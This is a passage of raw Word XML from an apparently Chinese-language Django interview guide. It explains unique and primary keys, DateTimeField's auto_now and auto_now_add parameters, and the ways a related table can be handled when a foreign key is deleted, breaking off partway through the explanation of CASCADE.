          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Unique key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是唯一键，一个表可以有多个唯一键字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BFEF04" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>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Primary key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>必须不能为空，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Unique Key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>可为空。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="684122C6"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07.DateTimeField</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>类型中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>auto_now</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>auto_now_add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>有什么区别</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DFFA38" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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DateTimeField.auto_now ==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>用于记录更新时间</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>==</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8F0C97"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这个参数的默认值为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，设置为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>时，能够在保存该字段时，将其值设置为当前时间，并且每次修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，都会自动更新。因此这个参数在需要存储</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>最后修改时间</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的场景下，十分方便。需要注意的是，设置该参数为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>时，并不简单地意味着字段的默认值为当前时间，而是指字段会被</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>强制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>更新到当前时间，你无法程序中手动为字段赋值；如果使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>再带的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>管理器，那么该字段在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中是只读的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E2B2F4" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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DateTimeField.auto_now_add ==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>用于记录创建时间</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>==</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F81A07"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这个参数的默认值也为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>False</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，设置为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>时，会在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象第一次被创建时，将字段的值设置为创建时的时间，以后修改对象时，字段的值不会再更新。该属性通常被用在存储</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>创建时间</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的场景下。与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>auto_now</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>类似，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>auto_now_add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>也具有强制性，一旦被设置为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，就无法在程序中手动为字段赋值，在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中字段也会成为只读的。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="160B3ACA"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08.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>当删除一个外键的时候，其关联的表有几种处理方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DB0C5B"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有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>种处理方式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3975E902" w14:textId="7669CBB5" w:rsidR="00024E97" w:rsidRPr="00FD3F5C" w:rsidRDefault="00FD3F5C"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1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>同时删除父表和子表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B78C56B" w14:textId="53B8D7B0" w:rsidR="00024E97" w:rsidRPr="00FD3F5C" w:rsidRDefault="00FD3F5C"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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>阻止删除父表</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633A95F3" w14:textId="75375B5E" w:rsidR="00024E97" w:rsidRPr="00FD3F5C" w:rsidRDefault="00FD3F5C"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3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>子表设置为空</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599783B0" w14:textId="67B91C95" w:rsidR="00024E97" w:rsidRPr="00FD3F5C" w:rsidRDefault="00FD3F5C"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4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>子表设置为默认值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A3CCCF" w14:textId="438A6EA6" w:rsidR="00024E97" w:rsidRPr="00FD3F5C" w:rsidRDefault="00FD3F5C"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5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>子表什么都不做</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF4DAD2" w14:textId="30C3AD13" w:rsidR="00024E97" w:rsidRPr="00FD3F5C" w:rsidRDefault="00FD3F5C" w:rsidP="00FD3F5C">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6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置为一个传递给</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SET()</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的值或者一个回调函数的返回值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01139587" w14:textId="77777777" w:rsidR="006C4F65"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CASCADE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7B77EA" w14:textId="23334610" w:rsidR="00024E97" w:rsidRPr="006C4F65" w:rsidRDefault="00024E97" w:rsidP="006C4F65">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6C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>代表删除联级，父表（少类表）被删除的记录在子表（多类表）中所有字段也会被对应删除，模拟</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语言中的</w:t>
      </w:r>
      <w:r w:rsidRPr="006C4F65">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ON DELETE CASCADE</w:t>
      </w:r>
